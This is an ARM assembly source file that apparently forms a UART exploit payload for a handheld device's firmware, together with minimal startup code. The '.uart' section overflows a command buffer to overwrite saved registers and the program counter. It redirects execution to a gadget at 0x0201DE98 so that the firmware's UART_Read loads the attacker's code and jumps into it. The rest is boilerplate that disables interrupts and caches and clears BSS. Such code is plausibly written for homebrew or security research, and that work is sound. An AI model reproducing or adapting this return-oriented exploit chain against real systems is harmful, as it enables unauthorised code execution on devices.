.section ".uart", "ax"
.arm

.global _uart_header
.type _uart_header, %function
_uart_header:
    // header area of payload
    // command
    .word 0
    .word 0
    // length of command payload in ASCII (9e)
    .word 0x6539
    // dataBuf, just fill with zeros
    .word 0
    .word 0
    .word 0
    .word 0
    .word 0
    .word 0
    .word 0
    .word 0
    .word 0
    .word 0
    .word 0
    .word 0
    .word 0
    .word 0
    .word 0
    .word 0
    .word 0
    .word 0
    .word 0
    .word 0
    .word 0
    .word 0
    .word 0
    .word 0
    .word 0
    // r3 = UART_Read ptr
    .word 0x0200DA4C
    // r4 = payload length (UART_Read r1)
    // provided in linkerscript
    .word __data_size
    // r5-r7
    .word 0
    .word 0
    .word 0
    // r8 - destination address (UART_Read r0)
    .word _start
    // r9
    .word 0
    // pc -> gadget
    .word 0x0201DE98
    // stack for "pop {r4-r8,pc}" at 0x0201DEB4
    .word 0
    .word 0
    .word 0
    .word 0
    .word 0
    // stack pc -> entrypoint, usually equal to dest addr (at 0x84)
    .word _start

.section ".crt0", "ax"
.arm

.global _start
.type _start, %function
_start:
    // disable irqs
    mov r0, #0x04000000
    str r0, [r0, #0x208]

    // configure cp15
    // disable itcm, dtcm, caches and mpu
    ldr r0,= 0x00002078
    mcr p15, 0, r0, c1, c0
    mov r0, #0
    // invalidate entire icache
    mcr p15, 0, r0, c7, c5, 0
    // invalidate entire dcache
    mcr p15, 0, r0, c7, c6, 0
    // drain write buffer
    mcr p15, 0, r0, c7, c10, 4

    // clear bss
    ldr r0,= __bss_start
    ldr r1,= __bss_end
    cmp r0, r1
    beq bss_done
    mov r2, #0
1:
    str r2, [r0], #4
    cmp r0, r1
    bne 1b
bss_done:
    b main

.pool
.end
